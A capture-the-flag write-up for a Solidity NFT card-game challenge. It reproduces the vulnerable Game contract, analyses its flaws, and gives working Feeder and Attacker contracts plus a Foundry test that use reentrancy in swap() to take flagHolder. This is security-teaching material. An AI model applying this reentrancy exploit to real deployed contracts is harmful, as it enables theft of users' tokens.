# Game

## Challenge

The Game.sol is deployed with the flagHolder holding an apparently unbeatable deck with perfect Mons.

Your mission is to obtain the flag: i.e. game.flagHolder() should return an address that you control

You also receive the contract for Game.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";


contract Game is ERC721 {

  uint256 public totalSupply; // total amount of Mons available

  uint8 constant WATER = 0;
  uint8 constant AIR = 1;
  uint8 constant FIRE = 2;
  uint8 constant DECK_SIZE = 3;

  uint256 private nonce = 123; // nonce used by pseudo-random generator


  // a Mon has 4 attributes
  struct Mon {
    uint8 water;
    uint8 air;
    uint8 fire;
    uint8 speed;
  }

  // a mapping from ids to Mons
  mapping(uint256 => Mon) public mons;

  // a mapping from players to their decks
  mapping(address => uint256[DECK_SIZE]) public decks;

  // a mapping from ids of Mons to booleans - if true, the Mon is for sale
  mapping(uint256 => bool) public forSale;

  // address of the flag holder
  address public flagHolder;

  constructor() ERC721("Hats Game 1", "HG1") {
    // create an unbeatable superdeck for the deployer
    Mon memory superMon = Mon(9,9,9,9);
    flagHolder = msg.sender;
    for (uint8 i; i < DECK_SIZE; i++) {
      decks[flagHolder][i] = _mintMon(flagHolder, superMon);
    }
  }
  
  // join the game and receive `DECK_SIZE` random Mons
  function join() external returns (uint256[DECK_SIZE] memory deck) {
    address newPlayer = msg.sender;
    require(balanceOf(newPlayer) == 0, "player already joined");

    // give the new player DECK_SIZE pseudorandom Mons
    deck[0] = _mintMon(newPlayer);
    deck[1] = _mintMon(newPlayer);
    deck[2] = _mintMon(newPlayer);

    decks[newPlayer] = deck;
  }

  // fight the flagHolder with your deck
  function fight() external {
    address attacker = msg.sender;
    address opponent = flagHolder;
    uint256[DECK_SIZE] memory deck0 = decks[attacker];
    uint256[DECK_SIZE] memory deck1 = decks[opponent];

    for (uint8 i = 0; i < DECK_SIZE; i++) {
      uint8 element = randomGen(3);
      // if the first player wins, burn the Mon of the second player
      if (_fight(deck0[i], deck1[i], element)) {
        _burn(deck1[i]);
      } else {
        _burn(deck0[i]);
      }
    }

    // winner is the player with most Mons left
    if (balanceOf(attacker) > balanceOf(opponent)) {
        flagHolder = attacker;
    }

    // replenish balance of both players so they can play again
    uint256[DECK_SIZE] memory deckAttacker = decks[attacker];
    uint256[DECK_SIZE] memory deckOpponent = decks[opponent];
    for (uint i; i < DECK_SIZE; i++) {
      if (!_exists(deckAttacker[i])) {
        deckAttacker[i] = _mintMon(attacker);
      }
      if (!_exists(deckOpponent[i])) {
        deckOpponent[i] = _mintMon(opponent);
      }
    }
    
    decks[attacker] = deckAttacker;
    decks[opponent] = deckOpponent;
  }

  // fight _mon0 againts _mon1 in element _element
  function _fight(uint256 _mon0, uint256 _mon1, uint8 _element) internal view returns(bool) {
    assert(_element < 3);
    Mon memory mon0;
    Mon memory mon1;

    mon0 = mons[_mon0];
    mon1 = mons[_mon1];

    if (_element == WATER) {
      if (mon0.water > mon1.water) {
        return true;
      } else if (mon0.water < mon1.water) {
        return false;
      } else {
        return mon0.speed > mon1.speed;
      }
    } else if (_element == AIR) {
      if (mon0.air > mon1.air) {
        return true;
      } else if (mon0.air < mon1.air) {
        return false;
      } else {
        return mon0.speed > mon1.speed;
      }
    } else if (_element == FIRE) {
      if (mon0.fire > mon1.fire) {
        return true;
      } else if (mon0.fire < mon1.fire) {
        return false;
      } else {
        return mon0.speed > mon1.speed;
      }
    }
  }

  // put a mon up for sale
  function putUpForSale(uint256 _monId) external {
    require(ownerOf(_monId) == msg.sender, "Can only put your own mons up for sale");
    forSale[_monId] = true;
  }

  // swap your mon with _monId1 for a mon with _monId2 that is for sale and owned by _to
  function swap(address _to, uint256 _monId1, uint256 _monId2) external {
    address swapper = msg.sender;
    require(forSale[_monId2], "Cannot swap a Mon that is not for sale");
    require(swapper != _to, "Cannot swap a Mon with yourself");

    _safeTransfer(swapper, _to, _monId1, "");
    _safeTransfer(_to, swapper, _monId2, "");

    // update the decks
    uint256 idx1 = indexInDeck(swapper, _monId1);
    uint256 idx2 = indexInDeck(_to, _monId2);
    decks[swapper][idx1] = _monId2;
    decks[_to][idx2] = _monId1;

  }

  function indexInDeck(address _owner, uint256 _monId) internal view returns(uint256 idx) {
    for (uint256 i; i < DECK_SIZE; i++) {
      if (decks[_owner][i] == _monId) {
        idx = i;
      }
    }

  }

  function swapForNewMon(uint256 _monId) external {
    address swapper = msg.sender;
    require(ownerOf(_monId) == swapper, "Can only swap your own Mon for a new Mon");
    uint256 idx = indexInDeck(swapper, _monId);
    _burn(_monId);
    decks[swapper][idx] = _mintMon(swapper);
  }

  function _mintMon(address _to, Mon memory mon) internal returns(uint256) {
    uint256 tokenId = totalSupply;
    totalSupply += 1;
    mons[tokenId] = mon;
    _mint(_to, tokenId);
    return tokenId;
  }

  function _mintMon(address _to) internal returns(uint256) {
    Mon memory newMon = genMon();
    return _mintMon(_to, newMon);
  }

  // generate a new Mon
  function genMon() private returns (Mon memory newMon) {
    // generate a new Mon
    uint8 fire = randomGen(10);
    uint8 water = randomGen(10);
    uint8 air = randomGen(10);
    uint8 speed = randomGen(10);
    newMon = Mon(fire, water, air, speed);
  }

  // function that generates pseudorandom numbers
  function randomGen(uint256 i) private returns (uint8) {
    uint8 x = uint8(uint256(keccak256(abi.encodePacked(block.number, msg.sender, nonce))) % i);
    nonce++;
    return x;
  }

   function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public override {
      // disable transferFrom - the only way to obtain a new Mon is by swapping
      require(false, "transfers of Mons are disabled");
    }

     function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes memory _data
    ) public override {
      // disable transferFrom - the only way to obtain a new Mon is by swapping
      require(false, "transfers of Mons are disabled");

    }
}
```

## Solution

### Setup
In the original Version, the contract was deployed on Rinkeby and you should solve the challenge by forking Rinkeby. Unfortunately, Rinkeby is not really in use anymore so I decided on developing my setup for the challenge using foundry. It can be found in the repo as POC_raw.sol. 

### Analysis

#### Bad Randomness
The first vulnerability I found is that you can exactly predict the stats of your mon, as the randomness is only derived from block.number and some other values that we know. So we can just keep increasing the block.number by waiting until we get the perfect values, which we can calculate ourselves.

#### Inefficient indexInDeck()
The loop in indexInDeck doesn't break when it finds the id inside the decks array. This is not that much of a problem as there are only 3 indexes. The bigger problem is, that in case of finding nothing it returns 0, which could also be a valid index.

#### ForSale not removed
The true value in forSale() stays set after the swap and doesn't get reset to 0. So one has to always trade his traded card after swapping, as this can't even be reset manually.

#### Reentrancy in swap()
There is a possible reentrancy attack introduced by the _safeMint() functions in the swap() function. Both _safeMint() functions allow for reentrancy, as there is no reentrancyGuard deployed. 


### Attacks
At first, I thought just generating 3 supermons would be enough to solve this chal. Unfortunately in this case you still lose all the fights, as you need to have a higher speed value. 

My next idea was to exploit the potential reentrancy in _safeMint() to loan myself 6 NFTS and be able to just lose 3 and still have a bigger balance than the other one. The "flash loan" exploiting the 2 _safeTransfers did actually work pretty well. Unfortunately, I ran into the issue that my first 3 NFTs were burned during the fight and I was not able to return the first 3 I used to swap for the following ones.

Further improving upon my reentrancy plan I had the idea, that as the forSale value stays set after the fight, we could swap our newly receive NFTs with the 0x0 address to get the right ids back using the commands:
```solidity
game.swap(address(0), 12, 3);
game.swap(address(0), 13, 4);
game.swap(address(0), 14, 5);
```
Unfortunately, this also didn't work as ERC721 includes an assert that reverts in case of a transfer to the 0 address.

### Exploit
Finally, I got an idea of how to solve the challenge. I could exploit the reentrancy between both safeMint functions, to transfer all my NFTs out (knowing that I will get one back for them later), and then as soon as all 3 are gone call join() again to get 3 new ones. As 3 would still not be enough, because the win function only changes if we have more NFTs in our balance than the flag holder (3 get destroyed during the fight so we then also have 3 left), we need to do this 2 times to have more left, even after losing 3. 

To exploit this I developed 2 contracts. A feeder account is used for storing our NFTs while we want to get new ones and an Attacker contract to facilitate the whole attack and claim the flag in the end.

Feeder:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./Game.sol";
import "./Attacker.sol";

contract Feeder is IERC721Receiver
{
    Game public game;
    Attacker atk; 
    constructor(address _game)
    {
        atk = Attacker(msg.sender);

        game = Game(_game);
        game.join();

        if (game.totalSupply() == 9)
        {
            game.putUpForSale(6);
            game.putUpForSale(7);
            game.putUpForSale(8);
        }
        else if (game.totalSupply() == 12)
        {
            game.putUpForSale(9);
            game.putUpForSale(10);
            game.putUpForSale(11);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4)
    {
        atk.getNext();
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
```


Attacker:
```solidity 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Game.sol";
import "./Feeder.sol";

contract Attacker is IERC721Receiver
{
    Game public game;
    Feeder feed1;
    Feeder feed2;
    uint256 nfts_sent = 0;

    constructor(address _game)
    {
        game = Game(_game);

        game.join();

        feed1 = new Feeder(_game);
        feed2 = new Feeder(_game);
    }

    function getEmAll() public
    {
        game.swap(address(feed1), 3, 6);
    }

    function getNext() public
    {
        nfts_sent++;
        if(nfts_sent == 3)
        {
            game.join();
        }
        else if (nfts_sent == 6)
        {
            game.join();
        }

        if (nfts_sent < 3)
        {
            game.swap(address(feed1), 3+nfts_sent, 6+nfts_sent);
        } 
        else if (nfts_sent < 6)
        {
            game.swap(address(feed2), 9+nfts_sent, 6+nfts_sent);
        }
    }

    function fightEmAll() public
    {
        game.fight();
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4)
    {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
}
```

### Finished POC


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";
import "../src/Game.sol";
import "../src/Attacker.sol";

contract Hack is Test {
    Game game;

    address bigBoss = makeAddr("bigBoss");
    address hacker = makeAddr("hacker");
    address hacker2 = makeAddr("hacker2");
    uint blockGasLimit = 120000;

    function setUp() public {
        //Deal some money to everyone
        vm.deal(bigBoss, 1 ether);
        vm.deal(hacker, 1 ether);

        vm.startPrank(bigBoss);
        //Deploy the game contract
        game = new Game();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(hacker);

        Attacker atk = new Attacker(address(game));

        //get 9 mons
        atk.getEmAll();

        //fight to make the atk contract the flag holder
        atk.fightEmAll();

        vm.stopPrank();

        assertEq(game.flagHolder(), address(atk));
    }
}
```